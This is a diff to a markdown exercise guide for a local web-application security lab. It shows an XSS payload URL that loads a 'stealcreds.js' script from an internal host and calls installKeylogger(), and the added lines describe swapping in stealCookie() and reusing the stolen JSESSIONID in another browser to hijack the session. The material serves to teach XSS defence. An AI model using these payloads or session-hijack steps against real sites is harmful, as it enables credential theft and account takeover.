@@ -104,3 +104,11 @@ Please stop and start the application again and open the malicious link with the
 http://localhost:8080/login?info=Welcome%20back!%3Cscript%20src=%27http://sprg-tools.el.eee.intern/js/stealcreds.js%27%3E%3C/script%3E%3Cscript%3EinstallKeylogger()%3C/script%3E
 Now no popup should be displayed. And you should see html code in the browser
 ![](images_exercises/Script_Tag_Escaped.png)
+
+## You may also steal the session cookie with an XSS 
+**Firtst off, please revert the changes made to the _page.tag_ template file!**
+Please replace the `installKeylogger()` function with `stealCookie()` in the URL!  
+The next steps should be obvious ;)
+>You may reuse the stole session id in a new browser session (you can open one in private browsing more in Chrome).  
+>Then open DevTools (or Inspector) go to Console and set the cookie with the command `document.cookie='JSESSIONID=...'`  
+>where ... is the value you have stolen from the target session.
